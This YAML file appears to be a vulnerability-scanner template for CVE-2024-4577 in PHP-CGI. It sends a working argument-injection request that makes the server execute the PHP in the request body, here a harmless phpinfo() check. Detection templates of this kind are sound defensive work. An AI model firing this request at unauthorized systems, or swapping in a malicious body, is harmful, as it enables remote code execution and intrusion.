id: CVE-2024-4577

info:
  name: RCE in PHP where CGI mode is used
  severity: critical
  author: omkar7505
  tags: rce,php

requests:
  - method: POST
    path:
      - "{{BaseURL}}/?%ADd+allow_url_include%3d1+%ADd+auto+prepend_file%3dphp://input"
      - "{{RootURL}}/?%ADd+allow_url_include%3d1+%ADd+auto+prepend_file%3dphp://input"
      - "{{RootURL}}/index.php?%ADd+allow_url_include%3d1+%ADd+auto+prepend_file%3dphp://input"
      - "{{RootURL}}/home.php?%ADd+allow_url_include%3d1+%ADd+auto+prepend_file%3dphp://input"
      - "{{RootURL}}/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto+prepend_file%3dphp://input"
      - "{{RootURL}}/php-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto+prepend_file%3dphp://input"
    
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      <?php
      phpinfo();
      ?>

    matchers-condition: and
    matchers:
      - type: word
        words: 
          - "PHP Version"
        part: body

      - type: status
        status:
          - 200
